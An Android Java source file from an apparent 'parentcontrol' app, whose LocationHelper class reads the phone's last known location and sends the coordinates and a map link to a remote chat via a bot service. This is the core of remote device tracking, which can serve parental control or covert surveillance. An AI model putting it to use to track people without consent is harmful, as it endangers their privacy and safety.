package com.parentcontrol;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import okhttp3.OkHttpClient;

public class LocationHelper {
    public static void getLocation(Context context, OkHttpClient client, String chatId) {
        BotService service = (BotService) context;
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location location = null;
            try { location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (SecurityException ignored) {}
            if (location == null) {
                try { location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (SecurityException ignored) {}
            }
            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                service.sendTextTo(chatId, "📍 Координаты:\n`" + lat + ", " + lon + "`\nhttps://maps.google.com/?q=" + lat + "," + lon);
            } else {
                service.sendTextTo(chatId, "❌ GPS недоступен или выключен");
            }
        } catch (Exception e) {
            service.sendTextTo(chatId, "❌ Ошибка геолокации: " + e.getMessage());
        }
    }
}
